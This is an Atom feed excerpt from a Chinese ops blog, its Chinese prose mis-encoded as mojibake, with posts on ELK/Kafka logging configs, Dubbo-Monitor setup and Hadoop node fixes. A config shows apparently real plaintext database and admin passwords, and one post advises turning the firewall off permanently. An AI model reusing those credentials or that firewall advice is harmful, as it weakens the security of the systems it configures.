class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;é…ç½®&lt;span class=&quot;built_in&quot;&gt;log&lt;/span&gt; stashï¼å®ç°ç³»ç»Ÿæ—¥å¿—æ”¶é›†input&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;file_to_kafka.conf æ—¥å¿—æ–‡ä»¶è¯»å‡ºå†™å…¥åˆ°kafka&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;input &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;file &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;path =&amp;gt; &lt;span class=&quot;string&quot;&gt;&quot;/srv/tomcat/logs/account/logFile.*.log&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;type&lt;/span&gt; =&amp;gt; &lt;span class=&quot;string&quot;&gt;&quot;tomcat&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;discover_interval =&amp;gt; 15 &lt;span class=&quot;comment&quot;&gt;#logstash&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;output &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#stdout &amp;#123; codec =&amp;gt; rubydebug &amp;#125;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;kafka&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;bootstrap_servers =&amp;gt; &lt;span class=&quot;string&quot;&gt;&quot;10.46.72.172:9092,10.47.88.103:9092,10.47.102.137:9092&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#group_id =&amp;gt; &quot;logstash&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;topic_id =&amp;gt; &lt;span class=&quot;string&quot;&gt;&quot;logstash&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2.2 logstash indexer é…ç½®&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;kafka_to_es.conf&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;input &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;kafka &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;zk_connect =&amp;gt; &lt;span class=&quot;string&quot;&gt;&quot;10.46.72.172:2181,10.47.88.103:2181,10.47.102.137:2181kafka&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;group_id =&amp;gt; &lt;span class=&quot;string&quot;&gt;&quot;logstash&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;topic_id =&amp;gt; &lt;span class=&quot;string&quot;&gt;&quot;logstash&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;reset_beginning =&amp;gt; &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;# boolean (optional)ï¼Œ default: false&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;consumer_threads =&amp;gt; 2 &lt;span class=&quot;comment&quot;&gt;# number (optional)ï¼Œ default: 1&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;decorate_events =&amp;gt; &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;# boolean (optional)ï¼Œ default: false&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;output &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;elasticsearch &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;hosts =&amp;gt; [&lt;span class=&quot;string&quot;&gt;&quot;10.47.88.206:9200&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;10.47.88.188:9200&quot;&lt;/span&gt;]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;index =&amp;gt; &lt;span class=&quot;string&quot;&gt;&quot;%&amp;#123;host&amp;#125;-%&amp;#123;+YYYY.MM.dd&amp;#125;&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# stdout &amp;#123; codec =&amp;gt; rubydebug &amp;#125;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&quot;eså®‰è£…æ’ä»¶headæŸ¥çœ‹ä¸‹æ•ˆæœï¼š&quot;&gt;&lt;a href=&quot;#eså®‰è£…æ’ä»¶headæŸ¥çœ‹ä¸‹æ•ˆæœï¼š&quot; class=&quot;headerlink&quot; title=&quot;eså®‰è£…æ’ä»¶headæŸ¥çœ‹ä¸‹æ•ˆæœï¼š&quot;&gt;&lt;/a&gt;eså®‰è£…æ’ä»¶headæŸ¥çœ‹ä¸‹æ•ˆæœï¼š&lt;/h4&gt;&lt;p&gt;ç„¶åæ‰“å¼€ç½‘ç«™ï¼š&lt;a href=&quot;http://elk.ihaozhuo.com/_plugin/head/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://elk.ihaozhuo.com/_plugin/head/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/es_head.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;####kibanaç½‘ç«™æ•ˆæœï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/es_kibana.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;æ­å»º-ElasticSearch-2-x-Logstash-2-x-Kibana-4-5-x-zookeeper3-4-6-Kafkaä¸ºæ¶ˆæ¯ä¸­å¿ƒçš„ELKæ—¥å¿—å¹³å°&quot;&gt;&lt;a href=&quot;#æ­å»º-ElasticSearch-2-x-Logstash-2-x-Kibana
    
    </summary>
    
      <category term="æ—¥å¿—åˆ†æå¹³å°" scheme="http://blog.yangcvo.me/categories/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E5%B9%B3%E5%8F%B0/"/>
    
    
      <category term="Log analysis platform" scheme="http://blog.yangcvo.me/tags/Log-analysis-platform/"/>
    
  </entry>
  
  <entry>
    <title>Dubboç›‘æ§Dubbo-Monitorçš„å®‰è£…é…ç½®ä½¿ç”¨</title>
    <link href="http://blog.yangcvo.me/2016/12/21/Java-Dubbo/Dubbo%E7%9B%91%E6%8E%A7Dubbo-Monitor%E7%9A%84%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E4%BD%BF%E7%94%A8/"/>
    <id>http://blog.yangcvo.me/2016/12/21/Java-Dubbo/Dubboç›‘æ§Dubbo-Monitorçš„å®‰è£…é…ç½®ä½¿ç”¨/</id>
    <published>2016-12-21T09:44:04.000Z</published>
    <updated>2017-04-26T02:33:11.000Z</updated>
    
    <content type="html">&lt;p&gt;å‰é¢æˆ‘å®‰è£…äº†Dubboç›‘æ§ç®¡æ§å°dubbo-adminçš„å®‰è£…é…ç½®å¯ä»¥åˆ°æˆ‘dubboä¹¦ç­¾ğŸ”–æŸ¥çœ‹ã€‚&lt;/p&gt;
&lt;h3 id=&quot;Dubbo-Monitor-è¯¦ç»†ä»‹ç»&quot;&gt;&lt;a href=&quot;#Dubbo-Monitor-è¯¦ç»†ä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;Dubbo Monitor è¯¦ç»†ä»‹ç»&quot;&gt;&lt;/a&gt;Dubbo Monitor è¯¦ç»†ä»‹ç»&lt;/h3&gt;&lt;p&gt;Dubbo Monitoræ˜¯é’ˆå¯¹Dubboå¼€å‘çš„ç›‘æ§ç³»ç»Ÿï¼Œå‚è€ƒ&lt;code&gt;dubbo-monitor-simple&lt;/code&gt;æ”¹è¿›è€Œæˆï¼Œå¯ä»¥ç†è§£ä¸ºå…¶æ¼”åŒ–ç‰ˆæœ¬ã€‚è¯¥ç³»ç»ŸMySQLæˆ–è€…Mongodbè®°å½•æ—¥å¿—çš„æ–¹å¼æ›¿ä»£äº†&lt;code&gt;dubbo-monitor-simple&lt;/code&gt;å†™æ–‡ä»¶çš„æ–¹å¼ã€‚&lt;/p&gt;
&lt;p&gt;PS: é¡¹ç›®ç›®å‰ä¾èµ–çš„æ˜¯dubboxçš„2.8.4ç‰ˆæœ¬ï¼Œä½†æ˜¯dubboxå¹¶æ²¡æœ‰ä¿®æ”¹è¿‡ç›‘æ§ç›¸å…³çš„ä»£ç ï¼Œå› æ­¤ç†è®ºä¸Šä¹Ÿå¯ä»¥æ”¯æŒdubboçš„æœ€æ–°ç‰ˆæœ¬ã€‚&lt;/p&gt;
&lt;p&gt;masteråˆ†æ”¯ï¼šMySQL&lt;/p&gt;
&lt;p&gt;mongodbåˆ†æ”¯ï¼šmongodb&lt;/p&gt;
&lt;p&gt;Dubbo-monitor ç äº‘ä¸Šé¢æœ‰å…±äº«æºä»£ç ï¼š&lt;a href=&quot;http://git.oschina.net/handu/dubbo-monitor&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;åŸºäºDubboxæœ€æ–°ç‰ˆæœ¬é‡æ–°å¼€å‘çš„ç®€å•ç›‘æ§&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;Dubbo-Monitoré…ç½®ä»‹ç»&quot;&gt;&lt;a href=&quot;#Dubbo-Monitoré…ç½®ä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;Dubbo-Monitoré…ç½®ä»‹ç»&quot;&gt;&lt;/a&gt;Dubbo-Monitoré…ç½®ä»‹ç»&lt;/h3&gt;&lt;p&gt;ä¸‹è½½ç›‘æ§ä»£ç ï¼š &lt;code&gt;git clone https://git.oschina.net/handu/dubbo-monitor.git&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ç¬¬ä¸€æ­¥&lt;/code&gt;ï¼šåˆ›å»ºæ•°æ®åº“&lt;br&gt;é¦–å…ˆåˆ›å»ºåç§°ä¸ºmonitoræ•°æ®åº“ï¼Œç¼–ç æ ¼å¼UTF-8ã€‚ç„¶åå°†é¡¹ç›®sqlæ–‡ä»¶å¤¹ä¸‹é¢çš„create.sqlå¯¼å…¥åˆ°æ•°æ®åº“ï¼Œç”Ÿæˆdubbo_invokeè¡¨ä»£è¡¨æˆåŠŸå¯¼å…¥ã€‚&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ç¬¬äºŒæ­¥&lt;/code&gt;ï¼šç¼–è¾‘é¡¹ç›®ä¸­application.propertiesï¼Œé…ç½®å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#### Dubbo Settings&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;dubbo.application.name=dubbo-monitor&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;dubbo.application.owner=ihaozhuo.com&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;dubbo.registry.address=zookeeper://10.28.32.30:2181?backup=10.47.100.23:2181,10.27.23.75:2181 &lt;span class=&quot;comment&quot;&gt;##è¿™é‡Œæˆ‘æ˜¯zkå¤šå°é›†ç¾¤ã€‚ä¸€å°ç›´æ¥åœ¨2181åé¢ç»“å°¾å°±è¡Œã€‚&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;dubbo.protocol.port=6060&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#### Database Settings&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;db.url=jdbc:mysql://&amp;lt;database_host&amp;gt;:&amp;lt;database_port&amp;gt;/monitor?prepStmtCacheSize=517&amp;amp;cachePrepStmts=&lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;&amp;amp;autoReconnect=&lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;&amp;amp;characterEncoding=utf-8    &lt;span class=&quot;comment&quot;&gt;###è¿™é‡Œè¯´æ˜ä¸‹&amp;lt;database_host&amp;gt;æ˜¯æ•°æ®åº“åœ°å€  &amp;lt;database_port&amp;gt; æ•°æ®åº“ç«¯å£  monitor æ•°æ®åº“&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;db.username=yjk_user   æ•°æ®åº“ç”¨æˆ·å&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;db.password=wrefdsf3426 æ•°æ®åº“å¯†ç &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;db.maxActive=500  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#### System Manager&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;manager.username=ihaozhuo    è¿™ä¸ªæ˜¯ç™»å½•ç›‘æ§çš„æ—¶å€™ç”¨æˆ·åå’Œå¯†ç &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;manager.password=haozhuo2015&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;ç¬¬ä¸‰æ­¥&lt;/code&gt;ï¼šæ‰“åŒ…è¿è¡Œé¡¹ç›®&lt;br&gt;æ‰§è¡Œmavenå‘½ä»¤ï¼š&lt;code&gt;mvn clean package&lt;/code&gt;&lt;br&gt;targetæ–‡ä»¶å¤¹ä¸‹ç”Ÿæˆçš„&lt;code&gt;dubbo-monitor.war&lt;/code&gt;å³ä¸ºé¡¹ç›®éƒ¨ç½²æ–‡ä»¶ï¼Œå°†å…¶æ”¾ç½®åˆ°å¯¹åº”æœåŠ¡å™¨ç›®å½•ä¸‹ï¼Œå¯åŠ¨æœåŠ¡å™¨å³å¯ã€‚ä¾‹å¦‚ï¼š&lt;code&gt;tomcatçš„webapps&lt;/code&gt;æ–‡ä»¶å¤¹ä¸‹ã€‚&lt;/p&gt;
&lt;p&gt;ç¬¬å››æ­¥ï¼šè®¿é—®é¡¹ç›®&lt;br&gt;å¯åŠ¨webæœåŠ¡å™¨åï¼Œè®¿é—®åœ°å€ï¼š&lt;code&gt;http://IP:[port]/moniotor&lt;/code&gt;ï¼Œé‡‡ç”¨é…ç½®æ–‡ä»¶ä¸­manager.usernameå’Œ&lt;code&gt;manager.password&lt;/code&gt;è®¾ç½®å€¼è¿›è¡Œç™»å½•ã€‚&lt;/p&gt;
&lt;h3 id=&quot;æœåŠ¡æä¾›ç«¯é…ç½®&quot;&gt;&lt;a href=&quot;#æœåŠ¡æä¾›ç«¯é…ç½®&quot; class=&quot;headerlink&quot; title=&quot;æœåŠ¡æä¾›ç«¯é…ç½®&quot;&gt;&lt;/a&gt;æœåŠ¡æä¾›ç«¯é…ç½®&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;http://dubbo.io/User+Guide-zh.htm#UserGuide-zh-%3Cdubbo%3Amonitor%2F%3E&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;DubboæœåŠ¡æä¾›ç«¯ç›‘æ§é…ç½®&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;è¿™é‡Œæ”¾äº†å¼ æˆ‘ä»¬ç°åœ¨é›†ç¾¤ç›‘æ§å›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/Dubbo-monitor.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;å‰é¢æˆ‘å®‰è£…äº†Dubboç›‘æ§ç®¡æ§å°dubbo-adminçš„å®‰è£…é…ç½®å¯ä»¥åˆ°æˆ‘dubboä¹¦ç­¾ğŸ”–æŸ¥çœ‹ã€‚&lt;/p&gt;
&lt;h3 id=&quot;Dubbo-Monitor-è¯¦ç»†ä»‹ç»&quot;&gt;&lt;a href=&quot;#Dubbo-Monitor-è¯¦ç»†ä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;
    
    </summary>
    
      <category term="tomcat" scheme="http://blog.yangcvo.me/categories/tomcat/"/>
    
    
      <category term="Java+Tomcat notes" scheme="http://blog.yangcvo.me/tags/Java-Tomcat-notes/"/>
    
      <category term="Dubbo" scheme="http://blog.yangcvo.me/tags/Dubbo/"/>
    
  </entry>
  
  <entry>
    <title>hadoopæ–°å¢èŠ‚ç‚¹é›†ç¾¤å¯åŠ¨è¯·æ±‚å¼‚å¸¸ï¼šLast contactï¼š200</title>
    <link href="http://blog.yangcvo.me/2016/12/08/%E5%A4%A7%E6%95%B0%E6%8D%AEhadoop/%20hadoop%E6%96%B0%E5%A2%9E%E8%8A%82%E7%82%B9%E9%9B%86%E7%BE%A4%E5%90%AF%E5%8A%A8%E8%AF%B7%E6%B1%82%E5%BC%82%E5%B8%B8%EF%BC%9ALast%20contact%EF%BC%9A200/"/>
    <id>http://blog.yangcvo.me/2016/12/08/å¤§æ•°æ®hadoop/ hadoopæ–°å¢èŠ‚ç‚¹é›†ç¾¤å¯åŠ¨è¯·æ±‚å¼‚å¸¸ï¼šLast contactï¼š200/</id>
    <published>2016-12-08T09:56:03.000Z</published>
    <updated>2017-03-14T05:45:12.000Z</updated>
    
    <content type="html">&lt;h3 id=&quot;å‰è¨€é—²è°ˆï¼š&quot;&gt;&lt;a href=&quot;#å‰è¨€é—²è°ˆï¼š&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€é—²è°ˆï¼š&quot;&gt;&lt;/a&gt;å‰è¨€é—²è°ˆï¼š&lt;/h3&gt;&lt;p&gt;ä¹‹å‰åšCDNäº‘è®¡ç®—å…¬å¸æ¥åˆ°ç¾å¹´å¤§å¥åº·ç°åœ¨åœ¨ä¸€å®¶åŒ»ç–—å¤§æ•°æ®å…¬å¸è´Ÿè´£è¿ç»´éƒ¨é—¨å¤§å¤§å°å°çš„æ´»ï¼Œæ—¢ç„¶æ˜¯åŒ»ç–—å¤§æ•°æ®å½“ç„¶ç¦»ä¸å¼€å¤§æ•°æ®å­˜å‚¨çš„ç»´æŠ¤ï¼Œç°åœ¨ä¹ŸåŒæ—¶ç»´æŠ¤å¤§æ•°æ®è¿ç»´ç›¸å…³å·¥ä½œ &lt;code&gt;hadoop,spark,sqoop,hue,hive,Hbase,zookeeper&lt;/code&gt;ç­‰ç­‰ æµ‹è¯•å¼€å‘ç”Ÿäº§ä½¿ç”¨èµ·æ¥,ä»é›†ç¾¤ç¯å¢ƒç»´æŠ¤ æå‡æ•°æ®ç¨³å®šæ€§ é«˜å¯ç”¨ç»´æŠ¤ã€‚&lt;/p&gt;
&lt;p&gt;å‰é¢è¯´äº†ä¸€å †è‡ªå·±é—²èŠï¼ŒçœŸæ­£è§£å†³è¿™æ¬¡é—®é¢˜æ˜¯hadoopæ–°å¢èŠ‚ç‚¹éœ€è¦æ³¨æ„å“ªå‡ ç‚¹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;code&gt;æ–°å¢èŠ‚ç‚¹å¦‚ä½•æ–°å¢æˆ‘ä¼šåœ¨å¦å¤–ä¸€ç¯‡è¯¦ç»†è¯´çš„è¿™é‡Œæˆ‘è®²ä¸€äº›éœ€è¦æ³¨æ„æ‰çš„é—®é¢˜ã€‚&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;éœ€è¦ä¿®æ”¹å‡ ä¸ªé…ç½®ï¼š&quot;&gt;&lt;a href=&quot;#éœ€è¦ä¿®æ”¹å‡ ä¸ªé…ç½®ï¼š&quot; class=&quot;headerlink&quot; title=&quot;éœ€è¦ä¿®æ”¹å‡ ä¸ªé…ç½®ï¼š&quot;&gt;&lt;/a&gt;éœ€è¦ä¿®æ”¹å‡ ä¸ªé…ç½®ï¼š&lt;/h3&gt;&lt;p&gt;ï¼ˆ1ï¼‰hadoop data æ•°æ®ç›®å½• VERSION é‡Œé¢çš„æ­å»ºé›†ç¾¤æ—¶ï¼Œç›´æ¥å…‹éš†ä¼šå‡ºç°è¿™ä¸ªé—®é¢˜ã€‚è§£å†³æ–¹æ³•åŒä¸Šä¸¤ç§ï¼Œæœ€å¥½ä¿®æ”¹${/hadoop/tmp/dir}/dfs/data/current/VERSIONä¸­çš„storageIDï¼Œä½¿å…¶ä¸åŒã€‚ç¬¬ä¸€ç§ä¼šå¯¼è‡´hdfsæ•°æ®ä¸¢å¤±ã€‚&lt;/p&gt;
&lt;p&gt;è§£å†³æ–¹æ³•ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;ï¼ˆ1ï¼‰ datanodeå¯åŠ¨æ˜¯ä¼šåŠ è½½DataStorageï¼Œå¦‚æœä¸å­˜åœ¨åˆ™ä¼šformat&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ï¼ˆ2ï¼‰åˆæ¬¡å¯åŠ¨DataStorageçš„storageIDæ˜¯ç©ºçš„ï¼Œæ‰€ä»¥ä¼šç”Ÿæˆä¸€ä¸ªstorageID&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;å‚è€ƒæˆ‘è§£å†³çš„ï¼š&lt;code&gt;è¿™é‡Œæˆ‘æ‹·è´è¿‡æ¥ ç›´æ¥åˆ é™¤ã€‚ç­‰é›†ç¾¤namenodeå¯åŠ¨ ä¼šè‡ªåŠ¨ç”Ÿæˆã€‚&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªè§£å†³ä»¥å æ–°å¢çš„æœºå™¨å¿…é¡»å…³é—­é˜²ç«å¢™ã€‚å› ä¸ºè¿™ä¸ªåŸå› ä¼šå¯¼è‡´æˆ‘ hadoopæ–°å¢èŠ‚ç‚¹é›†ç¾¤å¯åŠ¨è¯·æ±‚å¼‚å¸¸ï¼šLast contactï¼š200&lt;/p&gt;
&lt;p&gt;ï¼ˆ2ï¼‰ é›†ç¾¤é‡å¯æ—¶é˜²ç«å¢™è‡ªåŠ¨å¼€å¯å¯¼è‡´ï¼š&lt;/p&gt;
&lt;p&gt;è¿™é‡Œè´´å¼ å›¾ç‰‡ç»™å¤§å®¶çœ‹çœ‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/hadoop1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;é—®é¢˜ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;2012-07-04 18:43:30,475 INFO org.apache.hadoop.ipc.Client: Retrying connect to server: /192.168.18.218:9000. Already tried 8 time(s).&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2012-07-04 18:43:31,475 INFO org.apache.hadoop.ipc.Client: Retrying connect to server: /192.168.18.218:9000. Already tried 9 time(s).&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2012-07-04 18:43:31,479 ERROR org.apache.hadoop.hdfs.server.datanode.DataNode: java.io.IOException: Call to /192.168.18.218:9000 failed on &lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt; exception: java.net.NoRouteToHostException: æ²¡æœ‰åˆ°ä¸»æœºçš„è·¯ç”±&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        at org.apache.hadoop.ipc.Client.wrapException(Client.java:775)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        at org.apache.hadoop.ipc.Client.call(Client.java:743)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;è§£å†³æ–¹æ³•ï¼šåœ¨rootæƒé™ä¸‹å…³é—­é˜²ç«å¢™ï¼šservice iptables stop&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;æœ€å¥½é…ç½®æˆæœºå™¨é‡å¯é»˜è®¤é˜²ç«å¢™å…³é—­ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@junlings ~]&lt;span class=&quot;comment&quot;&gt;# chkconfig iptables off   #å¼€æœºä¸å¯åŠ¨é˜²ç«å¢™æœåŠ¡&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@junlings ~]&lt;span class=&quot;comment&quot;&gt;# chkconfig iptables on   #å¼€æœºå¯åŠ¨é˜²ç«å¢™æœåŠ¡&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
